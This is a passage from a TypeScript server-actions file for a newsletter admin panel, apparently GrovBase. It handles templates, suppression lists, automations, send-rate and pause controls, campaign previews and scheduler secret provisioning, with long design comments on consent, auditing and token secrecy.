 * alternative — two actions that differ only in whether they insert a campaign
 * first — is two places for the copying rule to drift apart.
 *
 * IT COPIES, IT DOES NOT REFERENCE. The campaign gets its own blocks, so
 * editing the template later never rewrites a campaign that has already been
 * sent, and editing the campaign never damages the template.
 */
export async function useTemplateAction(input: {
  templateId: string;
  /** Apply into this campaign instead of creating one. */
  campaignId?: string;
  stepIndex?: number;
  variant?: string;
}): Promise<Result<{ campaignId: string; stepId: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.templateId)) return { ok: false, error: "missing" };
    const template = await getTemplate(supabase, input.templateId);
    if (!template) return { ok: false, error: "missing" };

    let campaignId = input.campaignId;
    if (campaignId) {
      const gate = await editableCampaign(supabase, campaignId);
      if (!gate.ok) return gate;
    } else {
      const { data: created, error } = await supabase.from("newsletter_campaigns").insert({
        name: template.name.slice(0, 160), kind: "one_off", status: "draft",
        created_by: adminId, updated_by: adminId,
      }).select("id").single();
      if (error || !created) return { ok: false, error: "generic" };
      campaignId = created.id;
    }

    const stepIndex = Math.min(50, Math.max(0, Math.round(input.stepIndex ?? 0)));
    const variant = input.variant === "B" || input.variant === "C" ? input.variant : "A";

    const { data: step, error: stepError } = await supabase.from("newsletter_campaign_steps").upsert({
      campaign_id: campaignId,
      step_index: stepIndex,
      variant,
      subject: template.subject,
      preheader: template.preheader,
      editor: template.editor,
      blocks: template.blocks as never,
      body_html: template.bodyHtml,
    }, { onConflict: "campaign_id,step_index,variant" }).select("id").single();
    if (stepError || !step) return { ok: false, error: "generic" };

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.template_used",
      entityType: "newsletter_template", entityId: template.id,
      after: { campaignId, stepIndex, variant, created: !input.campaignId },
    });
    invalidate(PATHS.campaigns, `${PATHS.campaigns}/${campaignId}`, PATHS.templates);
    return { ok: true, data: { campaignId, stepId: step.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── SUPPRESSIONS ────────────────────────────────────────────────────────── */

/**
 * Block an address by hand.
 *
 * KEYED ON THE ADDRESS, NOT ON A CONTACT, which is what makes it survive the
 * contact being deleted and re-imported from a CSV six months later. There does
 * not have to be a contact at all: an operator who has been asked by e-mail to
 * never write to somebody can act on that before the address is ever on the
 * list.
 *
 * Anything already queued for that address is cancelled, because a block that
 * only applies to future campaigns is not what anybody means by "blocked".
 */
export async function addSuppressionAction(input: {
  email: string;
  reason?: string;
  note?: string | null;
}): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const email = normEmail(input.email ?? "");
    if (!isEmail(email)) return { ok: false, error: "email" };
    const reason = (SUPPRESSION_REASONS as readonly string[]).includes(input.reason ?? "")
      ? (input.reason as string) : "blocked";

    // Idempotent, and the FIRST reason wins: an address already on the list
    // because its owner unsubscribed must not be relabelled "blocked by an
    // operator". The address is suppressed either way; the reason is evidence.
    const { error } = await supabase.from("newsletter_suppressions").upsert({
      email, reason, note: clean(input.note, 200), created_by: adminId,
    }, { onConflict: "email", ignoreDuplicates: true });
    if (error) return { ok: false, error: "generic" };

    await supabase.from("newsletter_recipients")
      .update({ status: "cancelled" } as never)
      .eq("email", email).in("status", ["pending", "sending"]);

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.suppression_added",
      entityType: "newsletter_suppression", entityId: email, after: { reason },
    });
    invalidate(PATHS.suppressions, PATHS.contacts, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Lift a block.
 *
 * This is why `blockContactAction` leaves the contact's consent record alone:
 * removing the row restores the person to exactly where they were, consent date
 * and all. If the block had also cleared the consent flag, unblocking would
 * produce a contact who is no longer suppressed and no longer mailable, with no
 * record of the grant left to restore — and an operator with no way to tell
 * whether that person had ever agreed.
 *
 * AN UNSUBSCRIPTION IS A DIFFERENT THING. `newsletter_unsubscribe` writes both
 * the suppression row AND `marketing_consent = false`, because that one was the
 * contact's own decision. Lifting that suppression correctly leaves them
 * unmailable: only they can re-subscribe.
 */
export async function removeSuppressionAction(email: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const address = normEmail(email ?? "");
    if (!isEmail(address)) return { ok: false, error: "email" };

    const { error } = await supabase.from("newsletter_suppressions").delete().eq("email", address);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.suppression_removed",
      entityType: "newsletter_suppression", entityId: address,
    });
    invalidate(PATHS.suppressions, PATHS.contacts, PATHS.dashboard);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── AUTOMATIONS ─────────────────────────────────────────────────────────── */

/**
 * What sends itself, without a person pressing anything.
 *
 * AN AUTOMATION CANNOT BE ENABLED WITH NOTHING TO SEND. The check costs one
 * query and prevents the failure that is hardest to notice: a trigger that
 * fires correctly, for months, queueing nothing, while the screen says
 * "Włączona". A disabled automation may be saved half-built — that is what
 * drafting is — but switching it on asserts that it works.
 */
export async function saveAutomationAction(input: {
  id?: string;
  name: string;
  triggerType: string;
  triggerConfig?: Record<string, unknown>;
  campaignId: string;
  enabled?: boolean;
}): Promise<Result<{ id: string }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const name = (input.name ?? "").trim().slice(0, 160);
    if (!name) return { ok: false, error: "name" };
    if (!(AUTOMATION_TRIGGERS as readonly string[]).includes(input.triggerType)) {
      return { ok: false, error: "generic" };
    }
    if (!isUuid(input.campaignId)) return { ok: false, error: "missing" };
    const campaign = await getCampaign(supabase, input.campaignId);
    if (!campaign) return { ok: false, error: "missing" };

    const enabled = input.enabled === true;
    if (enabled) {
      const steps = await listSteps(supabase, input.campaignId);
      const usable = steps.filter((s) => s.subject.trim() && stepHasBody(s));
      if (usable.length === 0) return { ok: false, error: "body" };
    }

    const row = {
      name,
      enabled,
      trigger_type: input.triggerType,
      trigger_config: (input.triggerConfig ?? {}) as never,
      campaign_id: input.campaignId,
    };

    if (input.id) {
      if (!isUuid(input.id)) return { ok: false, error: "missing" };
      const { error } = await supabase.from("newsletter_automations")
        .update(row as never).eq("id", input.id);
      if (error) return { ok: false, error: "generic" };
      await logAudit(supabase, {
        actorId: adminId, action: "newsletter.automation_saved",
        entityType: "newsletter_automation", entityId: input.id,
        after: { name, trigger: input.triggerType, enabled },
      });
      invalidate(PATHS.automations, PATHS.campaigns);
      return { ok: true, data: { id: input.id } };
    }

    const { data: created, error } = await supabase.from("newsletter_automations")
      .insert({ ...row, created_by: adminId }).select("id").single();
    if (error || !created) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.automation_created",
      entityType: "newsletter_automation", entityId: created.id,
      after: { name, trigger: input.triggerType, enabled },
    });
    invalidate(PATHS.automations, PATHS.campaigns);
    return { ok: true, data: { id: created.id } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/** The switch on the list row. Turning one ON runs the same "has something to
 *  send" check the full save does — the shortcut must not be a way around it. */
export async function toggleAutomationAction(input: {
  id: string;
  enabled: boolean;
}): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(input.id)) return { ok: false, error: "missing" };
    const { data: row } = await supabase.from("newsletter_automations")
      .select("campaign_id, name").eq("id", input.id).maybeSingle();
    if (!row) return { ok: false, error: "missing" };

    if (input.enabled) {
      const steps = await listSteps(supabase, row.campaign_id as string);
      const usable = steps.filter((s) => s.subject.trim() && stepHasBody(s));
      if (usable.length === 0) return { ok: false, error: "body" };
    }

    const { error } = await supabase.from("newsletter_automations")
      .update({ enabled: input.enabled === true } as never).eq("id", input.id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.automation_toggled",
      entityType: "newsletter_automation", entityId: input.id,
      after: { name: row.name, enabled: input.enabled === true },
    });
    invalidate(PATHS.automations);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/** Delete the rule. The campaign it pointed at is untouched — an automation is
 *  a trigger, not the mail, and the sequence usually outlives the trigger. */
export async function deleteAutomationAction(id: string): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();
    if (!isUuid(id)) return { ok: false, error: "missing" };
    const { error } = await supabase.from("newsletter_automations").delete().eq("id", id);
    if (error) return { ok: false, error: "generic" };
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.automation_deleted",
      entityType: "newsletter_automation", entityId: id,
    });
    invalidate(PATHS.automations);
    return { ok: true };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── THE WORKER'S DIALS ──────────────────────────────────────────────────── */

/**
 * The kill switch.
 *
 * MARKETING ONLY, AND THE SEPARATION IS STRUCTURAL RATHER THAN CAREFUL. This
 * writes one key in `app_settings` that only the newsletter worker reads; auth
 * mail, login security codes and admin notifications go out through
 * `deliverHtml` and never consult it. Pausing sends does not — cannot — stop an
 * account verification from arriving, which is exactly what an operator needs
 * to be certain of before they dare press it.
 */
export async function setNewsletterPausedAction(paused: boolean): Promise<Result<{ paused: boolean }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const next = await writeSettings(supabase, { paused: paused === true });
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.worker_paused",
      entityType: "app_settings", entityId: "newsletter", after: { paused: next.paused },
    });
    invalidate(PATHS.dashboard, PATHS.campaigns);
    return { ok: true, data: { paused: next.paused } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * How fast to send.
 *
 * NOT A PERFORMANCE SETTING. GrovBase sends through one shared mailbox whose
 * SMTP password is the same credential the admin inbox polls IMAP with. Sending
 * too fast does not make a campaign arrive sooner — it gets the identity
 * throttled, and the throttle takes the signup mail and the inbox down with it.
 * `toSettings` clamps whatever arrives here to 10–20 000/h, so a slider bug
 * cannot become an outage; the clamp is the database's opinion, not this
 * action's, which is why it is not repeated here.
 */
export async function setNewsletterRateAction(ratePerHour: number): Promise<Result<{ ratePerHour: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const next = await writeSettings(supabase, { ratePerHour });
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.worker_rate",
      entityType: "app_settings", entityId: "newsletter", after: { ratePerHour: next.ratePerHour },
    });
    invalidate(PATHS.dashboard, PATHS.campaigns);
    return { ok: true, data: { ratePerHour: next.ratePerHour } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/**
 * Run one batch now, because an operator asked.
 *
 * IT CALLS THE WORKER MODULE, NOT AN HTTP ROUTE. A fetch to `/api/cron/...`
 * from a server action would leave the process, need an absolute origin that is
 * wrong on every preview deployment, and — worst — would have to authenticate
 * itself, which means either shipping the dispatch token to a place it does not
 * belong or opening a session-authorised door into the bulk sender. The queue
 * functions take the dispatch token and nothing else precisely so that no
 * navigation carrying an admin cookie can ever fire a mass mailing; reaching
 * for the route here would undo that on purpose.
 *
 * THE KILL SWITCH IS THE WORKER'S TO HONOUR. This action does not re-read
 * `paused` and refuse: one place decides whether a batch may run, and it is the
 * place that also runs the scheduled ones. Two opinions about the same switch
 * is how a pause stops meaning the same thing depending on who pressed send.
 */
export async function runWorkerNowAction(): Promise<
  Result<Awaited<ReturnType<typeof runWorkerBatch>>>
> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const outcome = await runWorkerBatch(supabase);
    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.worker_run",
      entityType: "app_settings", entityId: "newsletter",
      after: { ...outcome },
    });
    invalidate(PATHS.dashboard, PATHS.campaigns, PATHS.analytics);
    return { ok: true, data: outcome };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── BULK BLOCK ──────────────────────────────────────────────────────────────
 *
 * Appended for the contact list's bulk bar.
 */

/**
 * Block every selected contact's address in one go.
 *
 * WHY THIS EXISTS RATHER THAN A LOOP OVER `blockContactAction`. Twenty ticked
 * rows would be twenty server round trips, twenty audit entries describing one
 * decision, and twenty revalidations of the same three screens — and a partial
 * failure halfway through would leave the operator with no idea which half
 * happened. One action, one audit row, one answer.
 *
 * IT IS THE SAME RULE AS THE SINGLE BLOCK, on purpose, and the reasoning in
 * `blockContactAction` applies here unchanged: the contact rows are left alone
 * so the dated consent survives the block, an address already on the list keeps
 * its original reason (`ignoreDuplicates`), and everything already queued for
 * those contacts is cancelled — "blocked from now on" has to include the
 * messages that are already rows.
 *
 * ADDRESSES ARE READ THROUGH THE SERVICE, not taken from the browser. The
 * client knows the addresses it rendered, but a suppression list built from
 * what a form posted is a suppression list an attacker writes; the ids are
 * looked up and the addresses come from the database.
 */
export async function bulkBlockContactsAction(input: {
  contactIds: string[];
  reason?: string;
  note?: string | null;
}): Promise<Result<{ blocked: number }>> {
  try {
    const { supabase, adminId } = await requireAdmin();
    const ids = (input.contactIds ?? []).filter(isUuid).slice(0, 5000);
    if (ids.length === 0) return { ok: false, error: "missing" };

    const contacts = await contactsByIds(supabase, ids);
    if (contacts.length === 0) return { ok: false, error: "missing" };

    const reason = (SUPPRESSION_REASONS as readonly string[]).includes(input.reason ?? "")
      ? (input.reason as string) : "blocked";
    const note = clean(input.note, 200);

    const rows = contacts.map((c) => ({
      email: c.email, reason, note, created_by: adminId,
    }));
    for (let i = 0; i < rows.length; i += 500) {
      const { error } = await supabase.from("newsletter_suppressions")
        .upsert(rows.slice(i, i + 500), { onConflict: "email", ignoreDuplicates: true });
      if (error) return { ok: false, error: "generic" };
    }

    for (let i = 0; i < ids.length; i += 400) {
      await supabase.from("newsletter_recipients")
        .update({ status: "cancelled" } as never)
        .in("contact_id", ids.slice(i, i + 400))
        .in("status", ["pending", "sending"]);
    }

    await logAudit(supabase, {
      actorId: adminId, action: "newsletter.contacts_blocked",
      entityType: "newsletter_contact",
      // The count and the reason, never the addresses: an audit log is not a
      // place to accumulate a second copy of the contact list.
      after: { contacts: contacts.length, reason },
    });
    invalidate(PATHS.contacts, PATHS.suppressions, PATHS.dashboard);
    return { ok: true, data: { blocked: contacts.length } };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── THE PREVIEW ─────────────────────────────────────────────────────────────
 *
 * Appended for the campaign editor's "Podgląd" step.
 */

/**
 * Render one message exactly as it will leave the building, and hand the panel
 * the finished document.
 *
 * WHY THIS IS A SERVER ACTION RATHER THAN A RENDERER IN THE BROWSER.
 * `renderCampaign` is `server-only` deliberately: it is the ONE place a
 * campaign becomes an email. A second implementation in the editor — however
 * faithful on the day it is written — drifts from the real one a sanitiser
 * rule at a time, and an operator then approves a document nobody ever posts.
 * The round trip costs a few hundred milliseconds and buys the guarantee that
 * the preview IS the mail.
 *
 * IT RENDERS WITH NO TRACKING, for the reason `sendTestCampaignAction` gives.
 * `renderCampaign` only rewrites hrefs and adds a pixel when it is handed a
 * `tracking` block carrying a RECIPIENT id — which a preview does not have and
 * must not invent, because `/r/<recipient>/<link>` built from somebody else's
 * id would record their click. So a preview cannot contaminate the numbers
 * even by accident, and the operator sees clean links they can safely click.
 *
 * THE UNSUBSCRIBE LINK IS THE SITE ORIGIN, never a real token. This document
 * is opened in a browser, by a person whose job is to click everything in it.
 *
 * AND NOTHING IS WRITTEN, INCLUDING AN AUDIT ROW. Previewing is reading. An
 * operator polishing a subject line looks at this ten times a minute, and ten
 * audit entries a minute is how the log that records who deleted a contact
 * stops being readable.
 */
export async function previewCampaignAction(input: {
  campaignId: string;
  /** Which message. Omitted = the campaign's first step. */
  stepId?: string;
  /** Resolve the merge tags for this contact, so the operator reads the mail a
   *  real person gets instead of the empty case. */
  contactId?: string;
}): Promise<Result<{ subject: string; preheader: string; html: string; text: string }>> {
  try {
    const { supabase } = await requireAdmin();
    if (!isUuid(input.campaignId)) return { ok: false, error: "missing" };

    const campaign = await getCampaign(supabase, input.campaignId);
    if (!campaign) return { ok: false, error: "missing" };

    const steps = await listSteps(supabase, input.campaignId);
    const step = input.stepId ? steps.find((s) => s.id === input.stepId) : steps[0];
    if (!step) return { ok: false, error: "missing" };
    // An empty body is not a rendering failure, it is a campaign that has not
    // been written yet — and the panel has words for that. Rendering the shell
    // around nothing would show an operator a finished-looking email with a
    // footer and no message, which is the one thing they must not approve.
    if (!stepHasBody(step)) return { ok: false, error: "body" };

    // "Podgląd jako": the real values of a real contact, so a missing first
    // name shows up here rather than in four thousand inboxes.
    const contact = input.contactId && isUuid(input.contactId)
      ? await getContact(supabase, input.contactId) : null;

    const rendered = renderCampaign({
      editor: step.editor,
      blocks: step.blocks,
      bodyHtml: step.bodyHtml,
      subject: step.subject,
      preheader: step.preheader,
      merge: contact ? {
        first_name: contact.firstName ?? "",
        last_name: contact.lastName ?? "",
        email: contact.email,
        locale: contact.locale,
        source: contact.sourceKey,
      } : {},
      unsubscribeUrl: SITE_URL,
      // The footer follows the CONTACT's language, not the operator's: a
      // preview of what a German subscriber receives has to be in German, or
      // it is a preview of a different message.
      locale: contact?.locale ?? "pl",
    });

    return {
      ok: true,
      data: {
        subject: rendered.subject,
        preheader: rendered.preheader,
        html: rendered.html,
        text: rendered.text,
      },
    };
  } catch (e) { return { ok: false, error: message(e) }; }
}

/* ── THE SCHEDULER PROVISIONS ITSELF ─────────────────────────────────────── */

/**
 * PUT THE TWO SCHEDULER SECRETS WHERE pg_cron CAN READ THEM.
 *
 * The panel used to say "Nie ustawiono sekretu grovbase.newsletter.worker_url
 * w Vault" and stop there, which is a true sentence and a dead end: the two
 * values it names are not things an operator has. One is this deployment's own
 * address and the other is a token derived from a server key nobody can read
 * off a screen. Telling somebody to go and find them is telling them to fail.
 *
 * BOTH ARE ALREADY KNOWN TO THE SERVER, so the fix is a button rather than an
 * instruction:
 *
 *   worker_url    SITE_URL + the worker's path. Not a secret at all — it is a
 *                 public address — and it lives in the vault only because the
 *                 cron tick reads both of its inputs from one place.
 *   worker_token  dispatchToken(), the same value the worker route checks the
 *                 `x-newsletter-token` header against. It is derived from
 *                 GROVBASE_SERVER_KEY, never typed, never logged, and never
 *                 leaves this process except into the vault.
 *
 * THE SECRET IS NEVER RETURNED. The action answers with words — ok, or which
 * input was missing — and the panel re-reads the scheduler's status to find
 * out whether it worked. An action that handed the token back so the client
 * could "show" it would put it in a payload, a cache and a devtools tab.
 */
export async function provisionSchedulerAction(): Promise<Result> {
  try {
    const { supabase, adminId } = await requireAdmin();

    const token = dispatchToken();
    // No GROVBASE_SERVER_KEY means no token can exist, and writing half the
    // configuration would leave the tick failing one step later with a less
    // obvious message. Refuse with the name of the thing that is missing.
    if (!token) return { ok: false, error: "noServerKey" };
    if (!SITE_URL) return { ok: false, error: "noSiteUrl" };

    const url = `${SITE_URL.replace(/\/+$/, "")}/api/newsletter/worker`;
    const wroteUrl = await putSecret(supabase, "grovbase.newsletter.worker_url", url);
    if (!wroteUrl.ok) return { ok: false, error: wroteUrl.error };
    const wroteToken = await putSecret(supabase, "grovbase.newsletter.worker_token", token);
    if (!wroteToken.ok) return { ok: false, error: wroteToken.error };

    // The URL is safe to record; the token is referred to by name only.
    await logAudit(supabase, {
      actorId: adminId,
      action: "newsletter.scheduler.provisioned",
      entityType: "newsletter_scheduler",
      after: { url },
    });
    revalidatePath(PATHS.dashboard);
    return { ok: true };
  } catch (e) {
    return { ok: false, error: message(e) };
  }
}
